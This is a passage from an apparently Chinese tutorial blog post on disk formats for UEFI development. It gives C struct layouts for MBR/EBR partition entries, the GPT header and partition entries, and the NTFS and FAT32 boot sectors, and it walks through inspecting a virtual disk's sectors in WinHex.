0x30~0x37</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 MFTMirror; <span class="comment">// 0x38~0x3F</span></span><br><span class="line">    <span class="type">char</span> fileRecord;  <span class="comment">// 0x40</span></span><br><span class="line">    BYTE unusedBytes4[<span class="number">3</span>]; <span class="comment">// 0x41~0x43</span></span><br><span class="line">    <span class="type">char</span> indexSize;  <span class="comment">// 0x44</span></span><br><span class="line">    BYTE unusedBytes5[<span class="number">4</span>];  <span class="comment">// 0x45~0x48</span></span><br><span class="line">    BYTE volumeSerialID64[<span class="number">8</span>]; <span class="comment">// 0x49~0x4F</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> checksum;  <span class="comment">// 0x50~0x53</span></span><br><span class="line">    BYTE bootCode[<span class="number">426</span>];  <span class="comment">// 0x54~0x1FD</span></span><br><span class="line">    BYTE endSignature[<span class="number">2</span>]; <span class="comment">// 0x1FE~0x1FF</span></span><br><span class="line">&#125;NTFSDBR, *pNTFSDBR;</span><br></pre></td></tr></table></figure><h2 id="ebr分区表"><a href="#EBR分区表" class="headerlink" title="EBR分区表"></a>EBR分区表</h2><ul><li>对于EBR分区表，其实比较好理解，它的数据结构其实就和<code>MBR</code>分区表的数据结构一样，只不过<code>引导代码</code>没用就是了（其实是比较少用到），全部都被设置为<code>0</code>。</li><li>对于EBR分区表的DPT硬盘分区表其实数据结构就与<code>MBR</code>的<code>DPT</code>硬盘分区表一样，虽然<code>EBR</code>分区表的<code>DPT</code>也是有四个数组，但是只有两个是有效项，字段也完全一致，并且结束标识符也完全一样。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>  boot_flag;      <span class="comment">// 0x80 = active, 0x00 = inactive</span></span><br><span class="line">    <span class="type">uint8_t</span>  start_chs[<span class="number">3</span>];   <span class="comment">// 起始 CHS（已基本废弃）</span></span><br><span class="line">    <span class="type">uint8_t</span>  partition_type; <span class="comment">// 分区类型 (0x07 NTFS, 0x83 Linux, 0xEE GPT)</span></span><br><span class="line">    <span class="type">uint8_t</span>  end_chs[<span class="number">3</span>];     <span class="comment">// 结束 CHS</span></span><br><span class="line">    <span class="type">uint32_t</span> start_lba;      <span class="comment">// 起始 LBA</span></span><br><span class="line">    <span class="type">uint32_t</span> sector_count;   <span class="comment">// 分区扇区数</span></span><br><span class="line">&#125; MBR_PartitionEntry;</span><br><span class="line"></span><br><span class="line">MBR_PartitionEntry DPT[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">partition_type这边还是需要详细说明一下的</span></span><br><span class="line"><span class="comment">0x00表示未使用</span></span><br><span class="line"><span class="comment">0x01表示FAT12</span></span><br><span class="line"><span class="comment">0x04、0x0E表示FAT16</span></span><br><span class="line"><span class="comment">0x07表示NTFS、exFAT文件系统</span></span><br><span class="line"><span class="comment">0x0B、0x0c表示FAT32文件系统</span></span><br><span class="line"><span class="comment">0x05、0x0F表示扩展分区</span></span><br><span class="line"><span class="comment">0x82表示Linux Swap</span></span><br><span class="line"><span class="comment">0x83表示Linux文件系统ext4等</span></span><br><span class="line"><span class="comment">0xEE表示GPT保护型MBR</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="gpt分区表"><a href="#GPT分区表" class="headerlink" title="GPT分区表"></a>GPT分区表</h2><ul><li><p>参考文章：<a href="https://zh.wikipedia.org/zh-cn/GUID磁碟分割表">全局唯一标识分区表 - 维基百科，自由的百科全书</a></p></li><li><p>GPT的全称为<code>GUID Partition Table</code>，其缩写就是<code>GPT</code>，中文名就被称之为<strong>全局唯一标识分区表</strong>。是使用全局唯一标识符（GUID，也称通用唯一标识符）对物理计算机存储设备的分区表进行布局的标准。</p></li><li>GPT分区表是统一可扩展固件接口（UEFI）标准的一部分，因为MBR分区表的限制，使得GPT分区表的出现。</li></ul><blockquote><p><strong>MBR分区表的限制</strong>：</p><ol><li>MBR分区表不支持容量大于<code>2.2TB</code>的分区。不过一些硬盘制造商可以通过扩大扇区字节数，使得MBR分区表所支持的容量达到<code>16TB</code></li><li>MBR分区表不支持超过四个的分区。不过可以通过扩展分区表可以绕过这个限制使得分区数能超过4个。</li></ol><p><strong>GPT分区表的改善</strong>：</p><ol><li>GPT分区表可以支持容量到<code>9.4ZB</code>大小的分区（也就是$2^{64}-1$个扇区×$512$字节/扇区）。</li><li>GPT分区表可以支持128个分区，因为它有128个分区表项。</li></ol></blockquote><ul><li>这里再大致介绍一下GPT分区表各个扇区之间的一些结构分布，以便能快速定位到一些扇区。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/v2-cc06ac26fed369421fc2a82d211935b8_r.jpg" alt="img"></p><ul><li>直接创建一个虚拟磁盘，使用GPT分区表。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217093030664.png" alt="image-20251217093030664"></p><ul><li>对该磁盘进行初始化操作，并且使用GPT分区表。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217093103852.png" alt="image-20251217093103852"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217093126974.png" alt="image-20251217093126974"></p><ul><li>直接分离该虚拟磁盘，然后使用Winhex查看，就会看到保留MBR的相关数据</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217093222707.png" alt="image-20251217093222707"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217094711570.png" alt="image-20251217094711570"></p><h3 id="保留mrb"><a href="#保留MRB" class="headerlink" title="保留MRB"></a>保留MRB</h3><ul><li>为了兼容BIOS启动，在BIOS启动的时候不破坏GPT分区表，这就使得第一个扇区（也就是物理计算机存储设备的第一个<code>512</code>字节）存放的仍然是<code>MBR</code>，在GPT分区表中该<code>MBR</code>被称为<code>保留MBR</code></li><li>保留MBR中有数据会标识该MBR是保留MBR，关键数据如下。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217095504030.png" alt="image-20251217095504030"></p><h3 id="gpt头"><a href="#GPT头" class="headerlink" title="GPT头"></a>GPT头</h3><ul><li>接下来这个GPT头才是比较重要的东西，因为MBR在前面已经比较详细的学习过了，所以保留型MBR就找找关键的特征即可。GPT头是位于<code>LBA1</code>，也就是磁盘开头第二个扇区这边。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217101326441.png" alt="image-20251217101326441"></p><ul><li>下面就来介绍一下GPT头的数据结构：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GPTHeader</span>&#123;</span></span><br><span class="line">    BYTE signature[<span class="number">8</span>];<span class="comment">// 0x0~0x7 GPT头标识,已经是固定好的 EFI PART</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> revision; <span class="comment">// 0x8~0xB 版本号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> headerSize; <span class="comment">// 0xC~0xF 头的大小(是指有效数据)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> headerCRC32; <span class="comment">// 0x10~0x13 头校验</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> reserved; <span class="comment">// 0x14~0x17 保留字段</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 currentLBA; <span class="comment">// 0x18~0x1F 当前GPT Header所在LBA</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 backupLBA; <span class="comment">// 0x20~0x27 备份GPT头所在的LBA</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 firstUsableLBA;  <span class="comment">// 0x28~0x2F 第一个可用的数据扇区</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 lastUsableLBA;   <span class="comment">// 0x30~0x37 最后一个可用的数据扇区</span></span><br><span class="line">    BYTE diskGUID[<span class="number">16</span>];  <span class="comment">// 0x38~0x47 磁盘的GUID</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 partitionEntryLBA; <span class="comment">// 0x48~0x4F 分区表的起始LBA</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> numberOfPartitionEntries; <span class="comment">// 0x50~0x53 分区表项数量</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sizeOfPartitionEntry;  <span class="comment">// 0x54~0x57 单个分区表项的大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> partitionEntryArrayCRC32; <span class="comment">// 0x58~0x5B 分区表校验,对整个分区项数组计算CRC32</span></span><br><span class="line">    BYTE reserved2[<span class="number">420</span>]; <span class="comment">// 0x5C~0x200 填充字段也算是保留字段</span></span><br><span class="line">&#125;GPTHeader, *pGPTHeader;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217152941257.png" alt="image-20251217152941257"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217162254898.png" alt="image-20251217162254898"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217162656894.png" alt="image-20251217162656894"></p><h3 id="gpt分区表项"><a href="#GPT分区表项" class="headerlink" title="GPT分区表项"></a>GPT分区表项</h3><ul><li>由于之前没有对磁盘进行分区，导致GPT分区表项并没有数据，现在将该虚拟磁盘进行挂载，然后进行分区。新建一个FAT32的分区其大小为<code>50MB</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217165200783.png" alt="image-20251217165200783"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217165214707.png" alt="image-20251217165214707"></p><ul><li>接下来查看一下取消附加虚拟磁盘，再次使用Winhex打开这个文件，发现第二个扇区有数据了，数据如下：</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217170143011.png" alt="image-20251217170143011"></p><ul><li>GPT分区表项数据结构如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GPTPartitionEntry</span>&#123;</span></span><br><span class="line">    BYTE partitionTypeGUID[<span class="number">16</span>]; <span class="comment">// 0x0~0xf 分区类型GUID</span></span><br><span class="line">    BYTE uniquePartitionGUID[<span class="number">16</span>];  <span class="comment">// 0x10~0x1f 分区GUID</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 startingLBA;  <span class="comment">// 0x20~0x27 起始LBA</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 endingLBA;    <span class="comment">// 0x28~0x2f 结束LBA</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 attributes;   <span class="comment">// 0x30~0x37 分区属性</span></span><br><span class="line">    BYTE partitionName[<span class="number">72</span>];  <span class="comment">// 0x38~0x7f 分区名称,可以包括36个UTF-16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217170552001.png" alt="image-20251217170552001"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251217170702319.png" alt="image-20251217170702319"></p><h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><p>这里主要介绍FAT32文件系统和NTFS文件系统，下图还有一下常见的文件系统可以看看</p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215024431781.png" alt="image-20251215024431781"></p><h2 id="簇与文件系统"><a href="#簇与文件系统" class="headerlink" title="簇与文件系统"></a>簇与文件系统</h2><h2 id="fat32文件系统"><a href="#FAT32文件系统" class="headerlink" title="FAT32文件系统"></a>FAT32文件系统</h2><ul><li>参考博客：<a href="https://blog.csdn.net/yangyang031213/article/details/79030247">FAT32文件系统解析-CSDN博客</a></li><li><p>参考博客：<a href="https://zhuanlan.zhihu.com/p/162798821">FAT32系统文件详解 - 知乎</a></p></li><li><p>下图是FAT分区的主要结构，其主要结构分为三个部分：</p><ul><li>保留区：其中<code>DBR</code>位于保留区的第一个扇区，其中如果该文件系统是FAT32文件系统的话，那么该保留区的第二个扇区就会是<code>FSinfo</code>（FSinfo这个并没有在图中画出来，其实保留区还存放着FAT32的备份文件）</li><li>FAT1：文件分配表，</li><li>FAT2：文件分配表，通常用做FAT1的备份文件</li><li>根目录：无描述</li></ul></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251211174432273.png" alt="image-20251211174432273"></p><blockquote><p>注：这里只详细讲解FAT32，讲解完FAT32之后基本上FAT12和FAT16都能理解。</p></blockquote><h3 id="fat32的保留区"><a href="#FAT32的保留区" class="headerlink" title="FAT32的保留区"></a>FAT32的保留区</h3><p>这里直接来学习FAT32保留区的一些相关数据结构，熟悉之先来创建一个FAT32以真实的FAT32文件系统来进行学习。</p><ul><li>使用Windows自带的磁盘管理创建一个虚拟磁盘<code>VHD</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014553120.png" alt="image-20251215014553120"></p><ul><li>具体选项按照规定的来，大小就<code>50MB</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014626599.png" alt="image-20251215014626599"></p><ul><li>创建好后磁盘管理器会自动将这个虚拟磁盘挂载起来，但是挂载的这个磁盘还是空数据，连分区表都没有创建。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014733290.png" alt="image-20251215014733290"></p><ul><li>现在先进行初始化磁盘，为了方便学习FAT32文件系统，这里就选用简单的MBR分区表</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014818591.png" alt="image-20251215014818591"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014857429.png" alt="image-20251215014857429"></p><ul><li>初始化之后就新建简单卷即可。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215014927087.png" alt="image-20251215014927087"></p><ul><li>一直下一步直到出现下图这个界面</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015026789.png" alt="image-20251215015026789"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015037700.png" alt="image-20251215015037700"></p><ul><li>点击完成后一个带有FAT32文件系统的虚拟磁盘就创建好了</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015112234.png" alt="image-20251215015112234"></p><ul><li>接下来使用<code>Winhex</code>查看这个虚拟磁盘的二进制数据，首先第<code>0</code>个扇区定位到的是<code>MBR</code>分区表结构，通过第一个分区表可以快速定位FAT32的起始扇区</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015342876.png" alt="image-20251215015342876"></p><ul><li>定位到FAT32的起始扇区后具体看看这个FAT32文件系统的结构，首先就是FAT32文件系统的分区引导扇区<code>DBR</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015517181.png" alt="image-20251215015517181"></p><ul><li>接下来看下一个扇区，分区的第二个扇区其实就是<code>FSinfo</code>，该扇区存储的数据还是比较少的。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015620676.png" alt="image-20251215015620676"></p><ul><li>接下来就是该分区的第<code>2</code>个扇区，该扇区只有最后两个字节是<code>0x55、0xAA</code>，但是其余位置都是零。大概猜测也是用作拓展用的一个扇区</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215015917311.png" alt="image-20251215015917311"></p><ul><li>接下来的分区中<code>第3、4、5</code>个扇区都是没有数据的，而第<code>6</code>个扇区就有数据，并且该扇区的数据和FAT32的DBR数据是一样的。所以该扇区就是DBR的备份扇区，第<code>7</code>个扇区其实就是<code>FSinfo</code>的备份扇区，而第<code>8</code>个扇区其实就是与该分区的第<code>2</code>个扇区一样。这里就不贴图了。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215020130548.png" alt="image-20251215020130548"></p><ul><li>之后到<code>第12</code>个扇区的时候还会存储一个扇区的数据，该扇区其实是真正的引导代码（算是一段代码），该扇区开头的字符串是出错时的一个错误提示。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215021140863.png" alt="image-20251215021140863"></p><h3 id="fat32的dbr"><a href="#FAT32的DBR" class="headerlink" title="FAT32的DBR"></a>FAT32的DBR</h3><ul><li>大致了解了FAT32的保留分区存放着数据的相关内容，接下来就来看看具体的DBR数据结构的具体内容。首先来回顾一下上面所学的FAT32的DBR结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_DBR</span>&#123;</span></span><br><span class="line">    BYTE JumpInstruction[<span class="number">3</span>]; <span class="comment">// 0x00,跳转指令,通常为0xEB5890,其中58指示了跳转位置,在x86中,58+2就代表了跳转到5A处</span></span><br><span class="line">    BYTE OEMID[<span class="number">8</span>];  <span class="comment">// 0x03,厂商标识和OS版本信息</span></span><br><span class="line">    Basic_BPB BPB;  <span class="comment">// 0x0B BIOS Parameter Block,BIOS参数块.FAT 文件系统中最核心的一块结构</span></span><br><span class="line">    FAT32_Extend_BPB Extend_BPB;  <span class="comment">// 0x40 扩展BPB</span></span><br><span class="line">    BYTE Boot_Strap[<span class="number">420</span>];  <span class="comment">// 0x5A,文件系统引导代码</span></span><br><span class="line">    BYTE endSignature[<span class="number">2</span>];  <span class="comment">// 0x01FE,结束标识,固定为0x55  0xAA</span></span><br><span class="line">&#125;FAT32_DBR, *pFAT32_DBR;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215022258791.png" alt="image-20251215022258791"></p><ul><li>这里的最重要的部分其实就是<code>BIOS参数块</code>以及<code>拓展BIOS参数块</code>，接下来逐个看看这些参数块，先重新回顾一下<code>BIOS参数块</code>的结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Basic_BPB</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Bytes_per_Sector; <span class="comment">// 0xB~0xC 一个扇区占用的字节数</span></span><br><span class="line">    BYTE Sectors_per_Cluster; <span class="comment">// 0xD  一个簇占用的扇区数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Reserved_Sector; <span class="comment">// 0xE~0xF 保留扇区</span></span><br><span class="line">    BYTE FATs;  <span class="comment">//0x10 FAT表的个数，如果值为1表示只有一个FAT表没有备份;值为2表示有一个FAT表备份</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> RootEntry;  <span class="comment">// 0x11~0x12  根目录项数量,只有FAT12/FAT16使用此字段。FAT32分区这个字段必须为0</span></span><br><span class="line">    <span 